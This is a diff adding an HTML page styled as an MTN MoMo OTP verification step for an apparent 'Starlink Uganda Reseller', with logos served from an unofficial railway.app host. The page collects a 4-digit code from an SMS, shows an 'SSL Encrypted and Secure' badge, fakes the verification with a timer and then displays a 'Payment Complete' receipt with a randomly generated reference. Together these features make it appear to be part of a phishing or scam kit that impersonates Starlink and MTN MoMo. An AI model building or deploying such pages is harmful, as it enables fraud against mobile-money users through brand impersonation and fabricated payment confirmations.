@@ -1,0 +1,831 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP Verification - MTN MoMo | Starlink Uganda</title>
+    <link rel="icon" type="image/png" href="https://www.starlink.com/favicon.ico">
+    <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
+    <style>
+        /* ============================================
+           RESET & BASE
+        ============================================ */
+        *, *::before, *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --black: #000000;
+            --white: #ffffff;
+            --gray-50: #f9fafb;
+            --gray-100: #f3f4f6;
+            --gray-200: #e5e7eb;
+            --gray-300: #d1d5db;
+            --gray-400: #9ca3af;
+            --gray-500: #6b7280;
+            --gray-600: #4b5563;
+            --gray-700: #374151;
+            --gray-800: #1f2937;
+            --gray-900: #111827;
+            --green-500: #22c55e;
+            --green-600: #16a34a;
+            --red-500: #ef4444;
+            --momo-yellow: #FFCC00;
+            --momo-yellow-dark: #E6B800;
+            --orange-500: #f97316;
+            --orange-600: #ea580c;
+            --radius-md: 16px;
+            --radius-xl: 26px;
+            --radius-2xl: 30px;
+            --shadow-md: 0 4px 12px rgba(0,0,0,0.08);
+            --shadow-lg: 0 8px 20px rgba(0,0,0,0.12);
+            --shadow-2xl: 0 20px 40px rgba(0,0,0,0.2);
+            --header-h: 74px;
+            --footer-h: 68px;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background-color: var(--gray-50);
+            color: var(--gray-900);
+            line-height: 1.5;
+            padding-top: var(--header-h);
+            padding-bottom: var(--footer-h);
+            min-height: 100vh;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        body.modal-open {
+            overflow: hidden;
+            position: fixed;
+            width: 100%;
+        }
+
+        a { text-decoration: none; color: inherit; }
+        button { font-family: inherit; cursor: pointer; border: none; background: none; }
+
+        /* ============================================
+           HEADER
+        ============================================ */
+        .header {
+            position: fixed;
+            top: 0; left: 0; right: 0;
+            height: var(--header-h);
+            background-color: var(--black);
+            color: var(--white);
+            z-index: 100;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.4);
+        }
+
+        .header-inner {
+            max-width: 1200px;
+            margin: 0 auto;
+            height: 100%;
+            padding: 0 18px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .brand { display: flex; align-items: center; gap: 10px; }
+
+        .brand-logo-img {
+            height: 54px;
+            width: auto;
+            display: block;
+        }
+
+        .brand-divider { width: 1px; height: 26px; background: rgba(255,255,255,0.2); margin: 0 4px; }
+        .brand-sub { font-size: 12px; color: var(--gray-400); font-weight: 500; letter-spacing: 0.5px; }
+
+        .header-nav { display: none; gap: 26px; }
+        .header-nav a {
+            color: var(--gray-300);
+            font-size: 14px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 7px;
+            transition: color 0.2s;
+        }
+        .header-nav a:hover { color: var(--white); }
+        .header-nav i { font-size: 18px; }
+
+        /* ============================================
+           MAIN
+        ============================================ */
+        .main {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 22px 16px 36px;
+        }
+
+        .otp-wrap {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: calc(100vh - 160px);
+            padding: 8px 0;
+        }
+
+        .otp-card-wrap {
+            width: 100%;
+            max-width: 420px;
+        }
+
+        /* ============================================
+           YELLOW BAND
+        ============================================ */
+        .otp-band {
+            background: linear-gradient(135deg, #FFCC00 0%, #FFD633 100%);
+            border-radius: var(--radius-2xl) var(--radius-2xl) 0 0;
+            padding: 24px 22px 20px;
+            text-align: center;
+            box-shadow: var(--shadow-md);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .otp-band::before {
+            content: "";
+            position: absolute;
+            top: -40px; right: -40px;
+            width: 140px; height: 140px;
+            background: radial-gradient(circle, rgba(255,255,255,0.4), transparent 70%);
+            border-radius: 50%;
+            pointer-events: none;
+        }
+
+        .otp-band::after {
+            content: "";
+            position: absolute;
+            bottom: -50px; left: -50px;
+            width: 120px; height: 120px;
+            background: radial-gradient(circle, rgba(0,0,0,0.06), transparent 70%);
+            border-radius: 50%;
+            pointer-events: none;
+        }
+
+        .otp-band-logo {
+            height: 44px;
+            width: auto;
+            display: inline-block;
+            position: relative;
+        }
+
+        .otp-band-tagline {
+            font-size: 11px;
+            font-weight: 800;
+            color: #7A5A00;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-top: 10px;
+            position: relative;
+        }
+
+        /* ============================================
+           WHITE CARD
+        ============================================ */
+        .otp-body {
+            background: var(--white);
+            border-radius: 0 0 var(--radius-2xl) var(--radius-2xl);
+            padding: 24px 22px 26px;
+            box-shadow: var(--shadow-lg);
+        }
+
+        /* Top row: Back + Amount */
+        .otp-top {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 12px;
+            padding-bottom: 18px;
+            border-bottom: 1px solid var(--gray-200);
+            margin-bottom: 20px;
+        }
+
+        .back-link {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 13px;
+            font-weight: 800;
+            color: var(--gray-600);
+            transition: color 0.2s;
+        }
+
+        .back-link:hover { color: var(--gray-900); }
+        .back-link i { font-size: 18px; }
+
+        .amount-mini { text-align: right; }
+
+        .amount-mini-label {
+            font-size: 10.5px;
+            font-weight: 800;
+            color: var(--gray-400);
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+        }
+
+        .amount-mini-value {
+            font-size: 18px;
+            font-weight: 900;
+            color: var(--orange-500);
+            letter-spacing: -0.3px;
+            margin-top: 2px;
+        }
+
+        /* Instruction */
+        .otp-instruction {
+            font-size: 13.5px;
+            color: var(--gray-600);
+            line-height: 1.6;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .otp-instruction strong {
+            color: var(--gray-900);
+            font-weight: 800;
+        }
+
+        /* Phone chip */
+        .phone-chip {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            background: var(--gray-50);
+            border: 1.5px solid var(--gray-200);
+            border-radius: var(--radius-md);
+            padding: 11px 14px;
+            margin-bottom: 22px;
+        }
+
+        .phone-chip-icon {
+            width: 30px;
+            height: 30px;
+            border-radius: 8px;
+            background: var(--momo-yellow);
+            color: var(--black);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 15px;
+            flex-shrink: 0;
+            box-shadow: 0 2px 6px rgba(255,204,0,0.4);
+        }
+
+        .phone-chip-text {
+            font-size: 14px;
+            font-weight: 800;
+            color: var(--gray-900);
+            letter-spacing: 0.5px;
+        }
+
+        /* OTP label */
+        .otp-label {
+            display: block;
+            font-size: 11px;
+            font-weight: 800;
+            color: var(--gray-500);
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            margin-bottom: 12px;
+            text-align: center;
+        }
+
+        /* OTP boxes */
+        .otp-boxes {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 22px;
+        }
+
+        .otp-box {
+            width: 58px;
+            height: 66px;
+            border: 2px solid var(--gray-300);
+            border-radius: 14px;
+            text-align: center;
+            font-size: 28px;
+            font-weight: 900;
+            color: var(--gray-900);
+            background: var(--white);
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s, background 0.2s, transform 0.15s;
+            font-family: inherit;
+            caret-color: var(--orange-500);
+        }
+
+        .otp-box:focus {
+            border-color: var(--orange-500);
+            box-shadow: 0 0 0 4px rgba(249,115,22,0.15);
+            transform: translateY(-2px);
+        }
+
+        .otp-box.filled {
+            border-color: var(--momo-yellow-dark);
+            background: #FFFDF5;
+        }
+
+        /* Submit button */
+        .btn-otp {
+            width: 100%;
+            padding: 17px;
+            border-radius: var(--radius-md);
+            background: var(--orange-500);
+            color: var(--white);
+            font-weight: 900;
+            font-size: 14px;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 9px;
+            transition: transform 0.15s, filter 0.2s, box-shadow 0.25s, opacity 0.2s;
+            box-shadow: 0 6px 18px rgba(249,115,22,0.4);
+        }
+
+        .btn-otp:hover:not(:disabled) {
+            filter: brightness(0.96);
+            box-shadow: 0 8px 24px rgba(249,115,22,0.55);
+        }
+
+        .btn-otp:active:not(:disabled) { transform: scale(0.98); }
+
+        .btn-otp:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+
+        .btn-otp i { font-size: 18px; }
+
+        .btn-spinner {
+            width: 16px;
+            height: 16px;
+            border: 2.5px solid rgba(255,255,255,0.35);
+            border-top-color: var(--white);
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* Trust footer */
+        .trust-footer {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            font-size: 11px;
+            color: var(--gray-500);
+            font-weight: 700;
+            margin-top: 18px;
+            padding-top: 14px;
+            border-top: 1px dashed var(--gray-200);
+            letter-spacing: 0.5px;
+        }
+
+        .trust-footer i { font-size: 14px; color: var(--green-600); }
+
+        /* ============================================
+           SUCCESS OVERLAY (final screen)
+        ============================================ */
+        .success-overlay {
+            position: fixed;
+            inset: 0;
+            z-index: 10000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(160deg, #0a0a0a 0%, #1a1a1a 50%, #000000 100%);
+            color: var(--white);
+            padding: 24px;
+            overflow: hidden;
+        }
+
+        .success-overlay.open { display: flex; animation: fadeIn 0.4s ease; }
+
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        .success-overlay::before {
+            content: "";
+            position: absolute;
+            top: 50%; left: 50%;
+            width: 600px; height: 600px;
+            transform: translate(-50%, -50%);
+            background: radial-gradient(circle, rgba(34,197,94,0.22) 0%, transparent 60%);
+            animation: pulseGlow 3s ease-in-out infinite;
+            pointer-events: none;
+        }
+
+        @keyframes pulseGlow {
+            0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.6; }
+            50% { transform: translate(-50%, -50%) scale(1.15); opacity: 1; }
+        }
+
+        .success-content {
+            position: relative;
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+            z-index: 2;
+        }
+
+        .success-check {
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 26px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 60px rgba(34,197,94,0.6);
+            animation: popIn 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        @keyframes popIn {
+            0% { transform: scale(0.3); opacity: 0; }
+            60% { transform: scale(1.1); opacity: 1; }
+            100% { transform: scale(1); }
+        }
+
+        .success-check i { font-size: 54px; color: var(--white); }
+
+        .success-title {
+            font-size: 26px;
+            font-weight: 900;
+            letter-spacing: -0.5px;
+            margin-bottom: 8px;
+        }
+
+        .success-sub {
+            font-size: 14px;
+            color: var(--gray-400);
+            line-height: 1.65;
+            max-width: 320px;
+            margin: 0 auto;
+        }
+
+        .success-sub strong { color: var(--white); font-weight: 800; }
+
+        .success-receipt {
+            background: rgba(255,255,255,0.06);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: var(--radius-md);
+            padding: 16px 18px;
+            margin: 24px 0;
+            text-align: left;
+        }
+
+        .success-row {
+            display: flex;
+            justify-content: space-between;
+            gap: 12px;
+            font-size: 13px;
+            padding: 7px 0;
+        }
+
+        .success-row:not(:last-child) {
+            border-bottom: 1px dashed rgba(255,255,255,0.1);
+        }
+
+        .success-row span:first-child { color: var(--gray-500); font-weight: 500; }
+        .success-row span:last-child {
+            color: var(--white);
+            font-weight: 800;
+            text-align: right;
+            word-break: break-word;
+        }
+
+        .success-row .ref {
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            color: var(--momo-yellow);
+        }
+
+        .btn-done {
+            width: 100%;
+            padding: 17px;
+            border-radius: var(--radius-md);
+            background: var(--momo-yellow);
+            color: var(--black);
+            font-weight: 900;
+            font-size: 14px;
+            letter-spacing: 1.2px;
+            text-transform: uppercase;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 9px;
+            transition: transform 0.15s, filter 0.2s, box-shadow 0.25s;
+            box-shadow: 0 8px 22px rgba(255,204,0,0.4);
+        }
+
+        .btn-done:hover { filter: brightness(0.96); box-shadow: 0 10px 28px rgba(255,204,0,0.55); }
+        .btn-done:active { transform: scale(0.98); }
+        .btn-done i { font-size: 19px; }
+
+        /* ============================================
+           BOTTOM NAV
+        ============================================ */
+        .bottom-nav {
+            position: fixed;
+            bottom: 0; left: 0; right: 0;
+            height: var(--footer-h);
+            background: var(--white);
+            border-top: 1px solid var(--gray-200);
+            box-shadow: 0 -4px 20px rgba(0,0,0,0.08);
+            z-index: 100;
+        }
+
+        .bottom-nav-inner {
+            max-width: 1200px;
+            margin: 0 auto;
+            height: 100%;
+            padding: 0 12px;
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+        }
+
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+            color: var(--gray-600);
+            font-size: 11px;
+            font-weight: 700;
+            transition: color 0.2s, transform 0.2s;
+            padding: 6px 14px;
+            border-radius: 12px;
+        }
+
+        .nav-item i { font-size: 24px; }
+        .nav-item:hover { transform: translateY(-2px); }
+
+        /* ============================================
+           RESPONSIVE
+        ============================================ */
+        @media (min-width: 640px) {
+            .main { padding: 28px 22px 44px; }
+            .otp-band { padding: 28px 28px 24px; }
+            .otp-body { padding: 30px 28px 32px; }
+            .otp-band-logo { height: 50px; }
+            .success-title { font-size: 30px; }
+            .otp-box { width: 62px; height: 70px; }
+        }
+
+        @media (min-width: 768px) {
+            .header-nav { display: flex; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ============ HEADER ============ -->
+    <header class="header">
+        <div class="header-inner">
+            <a href="/" class="brand">
+                <img src="https://ug-starlinknetwork.up.railway.app/static/images/starlink_logo_new.png" alt="STARLINK" class="brand-logo-img">
+                <div class="brand-divider"></div>
+                <span class="brand-sub">Uganda Reseller</span>
+            </a>
+            <nav class="header-nav">
+                <a href="/dashboard/"><i class="uil uil-wifi"></i> <span>Status</span></a>
+                <a href="/plans/"><i class="uil uil-home"></i> <span>Plans</span></a>
+            </nav>
+        </div>
+    </header>
+
+    <!-- ============ MAIN ============ -->
+    <main class="main">
+        <div class="otp-wrap">
+            <div class="otp-card-wrap">
+
+                <div class="otp-band">
+                    <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo" class="otp-band-logo">
+                    <p class="otp-band-tagline">OTP Verification</p>
+                </div>
+
+                <div class="otp-body">
+
+                    <div class="otp-top">
+                        <a href="/sms-paste/" class="back-link">
+                            <i class="uil uil-arrow-left"></i> Back
+                        </a>
+                        <div class="amount-mini">
+                            <p class="amount-mini-label">Amount</p>
+                            <p class="amount-mini-value" id="display-amount">UGX 3,500.00</p>
+                        </div>
+                    </div>
+
+                    <p class="otp-instruction">
+                        Please enter the <strong>4-digit OTP code</strong> you received in the SMS.
+                    </p>
+
+                    <div class="phone-chip">
+                        <div class="phone-chip-icon">
+                            <i class="uil uil-mobile-android"></i>
+                        </div>
+                        <span class="phone-chip-text" id="display-phone">+256 7XXXXXXXX</span>
+                    </div>
+
+                    <form id="otpForm" method="POST" autocomplete="off" onsubmit="return false;">
+
+                        <label class="otp-label">Enter OTP Code</label>
+
+                        <div class="otp-boxes" id="otpBoxes">
+                            <input type="text" class="otp-box" maxlength="1" inputmode="numeric" autocomplete="off">
+                            <input type="text" class="otp-box" maxlength="1" inputmode="numeric" autocomplete="off">
+                            <input type="text" class="otp-box" maxlength="1" inputmode="numeric" autocomplete="off">
+                            <input type="text" class="otp-box" maxlength="1" inputmode="numeric" autocomplete="off">
+                        </div>
+
+                        <input type="hidden" name="otp_code" id="otp_code">
+
+                        <button type="submit" class="btn-otp" id="submitBtn" disabled>
+                            <i class="uil uil-check-circle"></i>
+                            <span>Verify &amp; Complete</span>
+                        </button>
+
+                    </form>
+
+                    <div class="trust-footer">
+                        <i class="uil uil-shield-check"></i>
+                        SSL Encrypted and Secure
+                    </div>
+
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- ============ SUCCESS OVERLAY ============ -->
+    <div class="success-overlay" id="successOverlay">
+        <div class="success-content">
+            <div class="success-check"><i class="uil uil-check"></i></div>
+            <h2 class="success-title">Payment Complete</h2>
+            <p class="success-sub">
+                Your <strong id="successPlan">plan</strong> is now active. Enjoy your high-speed Starlink internet.
+            </p>
+            <div class="success-receipt">
+                <div class="success-row"><span>Plan</span><span id="receiptPlan">—</span></div>
+                <div class="success-row"><span>Data</span><span id="receiptData">—</span></div>
+                <div class="success-row"><span>Amount</span><span id="receiptAmount">—</span></div>
+                <div class="success-row"><span>Phone</span><span id="receiptPhone">—</span></div>
+                <div class="success-row"><span>Reference</span><span class="ref" id="receiptRef">—</span></div>
+            </div>
+            <button class="btn-done" id="doneBtn">
+                <i class="uil uil-rocket"></i>
+                Go to Dashboard
+            </button>
+        </div>
+    </div>
+
+    <!-- ============ BOTTOM NAV ============ -->
+    <nav class="bottom-nav">
+        <div class="bottom-nav-inner">
+            <a href="/dashboard/" class="nav-item"><i class="uil uil-wifi"></i><span>Status</span></a>
+            <a href="/plans/" class="nav-item"><i class="uil uil-shopping-bag"></i><span>Plans</span></a>
+            <a href="/settings/" class="nav-item"><i class="uil uil-setting"></i><span>Settings</span></a>
+        </div>
+    </nav>
+
+    <!-- ============ SCRIPT ============ -->
+    <script>
+        // ============================================
+        // READ PLAN FROM URL
+        // ============================================
+        const params = new URLSearchParams(window.location.search);
+        const planName = params.get('plan') || 'Standard';
+        const planData = params.get('data') || '60GB';
+        const planPrice = parseInt(params.get('price') || '3500', 10);
+        const planPhone = params.get('phone') || '07xxxxxxxx';
+
+        document.getElementById('display-amount').textContent =
+            'UGX ' + planPrice.toLocaleString('en-UG', { minimumFractionDigits: 2 });
+        document.getElementById('display-phone').textContent =
+            '+256 ' + planPhone.replace(/^0/, '');
+
+        // ============================================
+        // OTP BOXES
+        // ============================================
+        const otpBoxes = document.querySelectorAll('.otp-box');
+        const otpCodeInput = document.getElementById('otp_code');
+        const otpForm = document.getElementById('otpForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const successOverlay = document.getElementById('successOverlay');
+        const doneBtn = document.getElementById('doneBtn');
+
+        function updateSubmitState() {
+            const val = Array.from(otpBoxes).map(b => b.value).join('');
+            otpCodeInput.value = val;
+            submitBtn.disabled = val.length !== 4;
+
+            otpBoxes.forEach(b => {
+                b.classList.toggle('filled', b.value.length === 1);
+            });
+        }
+
+        otpBoxes.forEach((box, index) => {
+            box.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/[^0-9]/g, '');
+
+                if (e.target.value.length === 1 && index < otpBoxes.length - 1) {
+                    otpBoxes[index + 1].focus();
+                }
+
+                updateSubmitState();
+
+                // Auto-submit when all 4 digits are entered
+                const otpValue = Array.from(otpBoxes).map(b => b.value).join('');
+                if (otpValue.length === 4) {
+                    setTimeout(() => submitOTP(), 350);
+                }
+            });
+
+            box.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+                    otpBoxes[index - 1].focus();
+                }
+            });
+
+            box.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const pastedData = e.clipboardData.getData('text');
+                const digits = pastedData.replace(/[^0-9]/g, '').slice(0, 4);
+
+                digits.split('').forEach((digit, i) => {
+                    if (i < otpBoxes.length) {
+                        otpBoxes[i].value = digit;
+                    }
+                });
+
+                updateSubmitState();
+
+                if (digits.length === 4) {
+                    setTimeout(() => submitOTP(), 350);
+                }
+            });
+
+            box.addEventListener('focus', (e) => {
+                e.target.select();
+            });
+        });
+
+        // Focus first box on load
+        otpBoxes[0].focus();
+
+        // ============================================
+        // SUBMIT OTP
+        // ============================================
+        otpForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            submitOTP();
+        });
+
+        function submitOTP() {
+            const val = Array.from(otpBoxes).map(b => b.value).join('');
+            if (val.length !== 4) return;
+
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<span class="btn-spinner"></span><span>Verifying...</span>';
+
+            // Simulate verification (replace with real API call)
+            setTimeout(() => {
+                showSuccess();
+            }, 1800);
+        }
+
+        // ============================================
+        // SUCCESS SCREEN
+        // ============================================
+        function showSuccess() {
+            const ref = 'MP' + Date.now().toString().slice(-8) + '.' + Math.random().toString(36).substring(2, 6).toUpperCase();
+
+            document.getElementById('successPlan').textContent = planName;
+            document.getElementById('receiptPlan').textContent = planName;
+            document.getElementById('receiptData').textContent = planData;
+            document.getElementById('receiptAmount').textContent = 'UGX ' + planPrice.toLocaleString('en-UG', { minimumFractionDigits: 2 });
+            document.getElementById('receiptPhone').textContent = '+256 ' + planPhone.replace(/^0/, '');
+            document.getElementById('receiptRef').textContent = ref;
+
+            successOverlay.classList.add('open');
+            document.body.classList.add('modal-open');
+        }
+
+        doneBtn.addEventListener('click', () => {
+            window.location.href = '/dashboard/';
+        });
+    </script>
+</body>
+</html>
